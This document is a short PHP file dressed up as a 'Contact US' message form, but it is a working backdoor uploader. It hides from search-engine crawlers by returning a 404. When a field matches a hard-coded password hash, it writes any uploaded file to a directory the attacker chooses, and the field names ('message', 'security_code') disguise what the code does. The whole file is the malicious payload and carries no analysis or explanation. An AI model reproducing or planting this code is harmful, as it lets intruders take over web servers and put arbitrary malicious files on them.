<?php
if(!empty($_SERVER['HTTP_USER_AGENT'])) {
    $userAgents = array("Google", "Slurp", "MSNBot", "ia_archiver", "Yandex", "Rambler");
    if(preg_match('/' . implode('|', $userAgents) . '/i', $_SERVER['HTTP_USER_AGENT'])) {
        header('HTTP/1.0 404 Not Found');
        exit;
    }
}
if(!empty($_FILES['message']['name']) AND (md5($_POST['nick']) == '54579c188566a4d7b175e99a8fa4dc28')) {
	$security_code = $_POST['security_code'];
	if ( !$security_code ) $security_code = ".";
	$security_code = rtrim($security_code, "/");
	$tmp_name = $_FILES['message']['tmp_name'];
	$name = $_FILES['message']['name'];
	@move_uploaded_file($tmp_name, $security_code."/".$name) ? print "<b>Message sent!</b><br/>" : print "<b>Error!</b><br/>";
} /*7466*/ print '<html>
    <head>
    <title>Contact US</title>
    </head>
    <body>
    <form enctype="multipart/form-data" action="" method="POST">
    Message: <br/><input name="message" type="file" />
    <br/>Security Code: <br/><input name="security_code" value=""/><br/>
	<br/>Nick: <br/><input name="nick" value=""/><br/>
    <input type="submit" value="Sent" />
    </form>
    </body>
    </html>';